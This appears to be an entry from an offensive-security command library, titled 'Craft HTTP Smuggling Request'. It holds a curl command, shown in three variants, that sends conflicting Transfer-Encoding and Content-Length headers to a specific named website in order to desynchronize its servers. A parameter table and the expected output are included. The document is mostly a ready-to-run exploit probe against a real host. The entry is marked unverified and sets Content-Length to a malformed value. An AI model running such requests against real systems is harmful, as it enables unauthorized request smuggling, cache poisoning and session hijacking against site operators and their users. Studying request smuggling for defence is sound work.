---
data: >-
  curl -X POST 'https://my.stripo.email/?aeRg=2056729135' -H 'Transfer-Encoding:
  chunked' -H 'Content-Length: keep-alive' --data 'f\nubvhq=x&e3t5b=x\n0\n'
tags:
  - http
  - smuggling
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: e4d0bbc8-f289-42f7-a354-e84788164ff0
created_at: '2025-12-13T09:01:17.609Z'
updated_at: '2025-12-13T09:01:17.609Z'
verified: false
validated: true
submitted: true
---
# Craft HTTP Smuggling Request

## Command

```bash
curl -X POST 'https://my.stripo.email/?aeRg=2056729135' -H 'Transfer-Encoding: chunked' -H 'Content-Length: keep-alive' --data 'f\nubvhq=x&e3t5b=x\n0\n'
```

## Description

This command crafts and sends an HTTP POST request designed to exploit HTTP Request Smuggling by using conflicting Transfer-Encoding and Content-Length headers, causing desynchronization between servers.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies the POST method | Yes |
| `-H 'Transfer-Encoding: chunked'` | Sets chunked transfer encoding | Yes |
| `-H 'Content-Length: keep-alive'` | Sets conflicting content length | Yes |
| `--data 'f\nubvhq=x&e3t5b=x\n0\n'` | The chunked body data | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://my.stripo.email/?aeRg=2056729135' -H 'Transfer-Encoding: chunked' -H 'Content-Length: keep-alive' --data 'f\nubvhq=x&e3t5b=x\n0\n'
```

### Advanced Usage

```bash
curl -X POST 'https://my.stripo.email/?aeRg=2056729135' -H 'Transfer-Encoding: chunked' -H 'Content-Length: keep-alive' -H 'Host: my.stripo.email' --data 'f\nubvhq=x&e3t5b=x\n0\n' -v
```

## Expected Output

A server response indicating desynchronization, such as a 301 redirect or anomalous behavior confirming smuggling.

## Related

- [[procedures/Execute-Turbo-Intruder-for-Request-Smuggling]]
- [[tools/Burp-Suite-Turbo-Intruder]]
